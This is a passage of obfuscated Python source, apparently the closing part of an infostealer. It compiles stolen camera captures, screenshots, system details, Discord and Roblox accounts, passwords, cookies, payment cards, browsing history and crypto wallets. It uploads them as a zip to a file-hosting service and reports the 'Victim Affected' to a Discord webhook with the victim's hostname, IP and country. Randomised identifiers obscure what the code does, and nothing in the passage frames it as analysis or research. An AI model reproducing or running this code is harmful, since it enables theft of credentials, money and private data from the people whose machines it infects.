        MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture = f"Error: {e}"

    try: 
        MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_screenshot = ZSBWPKJHAAVTJHGBHKKCCWMPGPNKOVOILSGZHKJBWAKXYYSEOXZVOHHXFWBLCYLDRTGUQDHUDC(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT)
    except Exception as e:
        MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_screenshot = f"Error: {e}"

    try: 
        BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM, YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ, QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH = ERZBOVJUDQWKNKHPPOAJIVZDYCOCPDZWTLGPTMARVCWKBNNITVWRULLBTZXIRFUPMUKKLNNERGNYEJCKQJGVKJOQYJXBWLCHI(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT)
    except Exception as e:
        MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_screenshot = f"Error: {e}"

    try: 
        MWIKAZDZESBWGLWXWWGBLKSRPUHLVHDKGVHQTYXNSFZYPZNHURBDKEHCQEJPW = JTQFHFNLMVNTIKLIZLDNNDYFEEXICZTREIWUQFRJURITVUBPFXUMVEVTGZDTQLLPVIFFGGEAUNHQKCDJOQOTFRAZGMVAJB(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT)
    except Exception as e:
        MWIKAZDZESBWGLWXWWGBLKSRPUHLVHDKGVHQTYXNSFZYPZNHURBDKEHCQEJPW = f"Error: {e}"

    if FFINAXAURGQGKCPFDVSBNGUAJJLFDUQPBISTNRVNUCZZVGFBUEXSQXZDZJAQCHQY != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Discord Injection : {FFINAXAURGQGKCPFDVSBNGUAJJLFDUQPBISTNRVNUCZZVGFBUEXSQXZDZJAQCHQY}")

    if MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Camera Capture    : {MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture}")

    if MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_screenshot != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Screenshot        : {MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_screenshot}")

    if MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_system_info != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"System Info       : {MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_system_info}")

    if CSGWQNYOPUUJUKJYRLYLLDRJAMEBYWUGAXDOSWZGJROQHYSSXSMCNZ != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Discord Accounts  : {CSGWQNYOPUUJUKJYRLYLLDRJAMEBYWUGAXDOSWZGJROQHYSSXSMCNZ}")

    if LVBHSDGVISAOFNXECQVBSNZGYAEHZWBEUYEUAWNKCRWUWZITSCTXWXFIVUULQLDOHIUUJYUSKCCPXUPXBZ != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Roblox Accounts   : {LVBHSDGVISAOFNXECQVBSNZGYAEHZWBEUYEUAWNKCRWUWZITSCTXWXFIVUULQLDOHIUUJYUSKCCPXUPXBZ}")

    if LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Passwords         : {LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA}")

    if KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Cookies           : {KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ}")

    if UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Cards             : {UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD}")

    if MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Browsing History  : {MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM}")

    if KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Download History  : {KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT}")

    if YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Extentions        : {YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE}")

    if BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Wallets           : {BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM}")

    if YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Game Launchers    : {YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ}")
    
    if QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Apps              : {QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH}")
    
    if MWIKAZDZESBWGLWXWWGBLKSRPUHLVHDKGVHQTYXNSFZYPZNHURBDKEHCQEJPW != None:
        TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE.append(f"Interesting Files : {MWIKAZDZESBWGLWXWWGBLKSRPUHLVHDKGVHQTYXNSFZYPZNHURBDKEHCQEJPW}")

ZTJWVQWWWLUNQOXYCSKCPGAAAOVWANLCEAOFXIMSREVDZBFGOCUHPGLORDEAIPXHMVPMSKPOVWDHGBMIPFCBQIJPLTLALFA.seek(0)

try:
    try: VKUOCSDOJZPBGGUNHQIHOVCNJZCJALKGYFRGRDBBGKSHMQSOCKVGVCKSOTZSADHYZBNSRQSRCBYRJWDYENYMAJZSQKOKGJHHWSG = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: VKUOCSDOJZPBGGUNHQIHOVCNJZCJALKGYFRGRDBBGKSHMQSOCKVGVCKSOTZSADHYZBNSRQSRCBYRJWDYENYMAJZSQKOKGJHHWSG = "store4"

    EHQBZSOYQBUGXILKNFCAVBUMVDAEUDYCFPXUXGRXUPDGSTBRPUYDRGTFKSSQAMOJZELWYEVNAPNVWAVHIARGKBUV = requests.post(
        f"https://{VKUOCSDOJZPBGGUNHQIHOVCNJZCJALKGYFRGRDBBGKSHMQSOCKVGVCKSOTZSADHYZBNSRQSRCBYRJWDYENYMAJZSQKOKGJHHWSG}.gofile.io/uploadFile",
        files={"file": (f"EliteScripts{SZCNPOJILKSWMCXDBUMAUATSVEIKOJTLIPJNALNKJHWLNUFRLOFMJEITFPHIUOYDMSYB.replace(' ', '_')}.zip", ZTJWVQWWWLUNQOXYCSKCPGAAAOVWANLCEAOFXIMSREVDZBFGOCUHPGLORDEAIPXHMVPMSKPOVWDHGBMIPFCBQIJPLTLALFA)}
    )

    OLJMSADRBYHLQCQGJIHXONMLZZJNGKVHZZQBTLLFXEBTJHVNMPYJAGKHFDKZUQRUZJPLMSVZHX = EHQBZSOYQBUGXILKNFCAVBUMVDAEUDYCFPXUXGRXUPDGSTBRPUYDRGTFKSSQAMOJZELWYEVNAPNVWAVHIARGKBUV.json()["data"]["downloadPage"]
except Exception as e:
    OLJMSADRBYHLQCQGJIHXONMLZZJNGKVHZZQBTLLFXEBTJHVNMPYJAGKHFDKZUQRUZJPLMSVZHX = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=RIXLEQPLMUHMSSKQPPMAGAQPAGTOYFFAWGQWWADVLQJNNTLPOEZMZDMYDWHBZPIVZSSQQZPIIULKGZI
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {WRKKJDYVKEKQDDHPNDCSLKSGGVUNSHXCIZGTHGOLAQLUCYAZFCJLRMAVBECJOPIFQLDCVTYBSCEDCZUZSMEWVRT}
Username    : {SZCNPOJILKSWMCXDBUMAUATSVEIKOJTLIPJNALNKJHWLNUFRLOFMJEITFPHIUOYDMSYB}
DisplayName : {HMXCICLUUUAZJSNJJPRWKUKWNNYLRFZZOKVVUFRMISGDMHDSNIUKNALUGSBUSRSMAYRPZIOFBGFOFJBMOVBMTDYCSUXDD}
Ip Public   : {GQQIBMMUAQUOYYHFYSOAQXVXRFDMRHHWFLFXGJMBVDTILRPJRPWJCSZPGOR}
Ip Local    : {FCWIGGWDXVOQXSKLYALTEPUALSKHTRAIQBHYSGHYAFOTRSUZDALPIBMEKWRXHPKPNYWELBQCJQQQQTZH}
Country     : {CLICFSVOZNXLCGIISOLVCVVMMFUWYGJYWMTHSCRZMJCCGPTQBIEOKXQPMASMYZT}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(TJPSYRVIPUWSKTOJSQFVSFJMICSXVLALGTIMEINHIXDFLUFMYPUUCPWAGPCWTLWEHAQBGE)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{OLJMSADRBYHLQCQGJIHXONMLZZJNGKVHZZQBTLLFXEBTJHVNMPYJAGKHFDKZUQRUZJPLMSVZHX}"""
).set_footer(
    text=KBICMAEAARZZJSSWCJLBCDUJCLAVGGAHNWRAAELNTSVEBKLVXWDFFRTFQXVVNGGCNCJJDTYTDWFKU, 
    icon_url=IFISLJOHJJNLKZHKCUXIHVQOJWNFURSZKKHCUZLITEBCGQGXAPMAXSLVNTVKIZPYJVGQPAXJMCBSYCOW
)

try:  
    TWEHBFAQLUKWVCWWGQHVAISKPZLZGCFTKIPIOFQQRYYKBFKMQNKSRYLMYWZAOSJLJCCFNZTB = discord.SyncWebhook.from_url(HYVTIEFNXQGBLJNECPXXVUFBSKQCXIBXJLUAJXFHHINHZGPRPBPHEDJRZPCLPYGFJ)
    TWEHBFAQLUKWVCWWGQHVAISKPZLZGCFTKIPIOFQQRYYKBFKMQNKSRYLMYWZAOSJLJCCFNZTB.send(embed=embed, username=ZCNCOZGPXXOICJMAUBKAUBCDZIQMNZOUDYETYKRNAKGUNDQQAJCVRBWBZZHBRWGWGPZZOJVNRSUGZSOZQXRRSFOTUJAKVZSSAWW, avatar_url=IFISLJOHJJNLKZHKCUXIHVQOJWNFURSZKKHCUZLITEBCGQGXAPMAXSLVNTVKIZPYJVGQPAXJMCBSYCOW)
except: pass


try: threading.Thread(target=RHOFYVYNDQAQMYJEQDCSREYEZRQKABZDSMSQRTASBAHSPQQWGRXAXFOFLKZNUZZNBMMRFKRLUANXXBKQTPDKOUTBCCMTIRDOO).start()
except: pass
try: threading.Thread(target=ZTOZMACREVUBMZREOESEMPFLNKRAZBYIEWFGMGXUPHLYBBYGOQYUTUWGOUXXNNROXCJHKOCFMRVECNNANLMLQPJC).start()
except: pass
try: threading.Thread(target=VUVPKEWFBFKQJKWTAIIPRTDSQJWTVDQDIZWPVCMOEEJDYXEZRJGACAOOPEPQSBU).start()
except: pass
try: threading.Thread(target=BABGYMQDWWZTXYRANFXSNNWBTCRQAHWFRSMOIDDHTLYGNLOIRYYCYXHMWBRSJNTWRAODJISRCZPOIAZSVU).start()
except: pass
try: threading.Thread(target=FITWQQZSGCJAEJRKTYUQMUAMMWSPQAXJSKRPAPGIHOQRVNYXEJHTNMJNSJD).start()
except: pass
try: threading.Thread(target=RAYPJGEKTJUNIKEXHBLYCNDWKZLURGQTCAMBDSUGFQCOTHLEZQX).start()
except: pass
try: threading.Thread(target=LOPJBNQDFQQKDRFMBCDAGTQAAHATAFBARTZYSFMBTSMOCLOSVDBPFQRNPHPYOGITXTUZNDIAXSVIOXFBUMXIOT).start()
except: pass
try: threading.Thread(target=FZMJGYDFKWYQQVTOWNOQBLVYEIQNJLKAPPQRBRWICWMMOCGUTZIPGYZJSYILHJKKNYKJYRVFNV).start()
except: pass
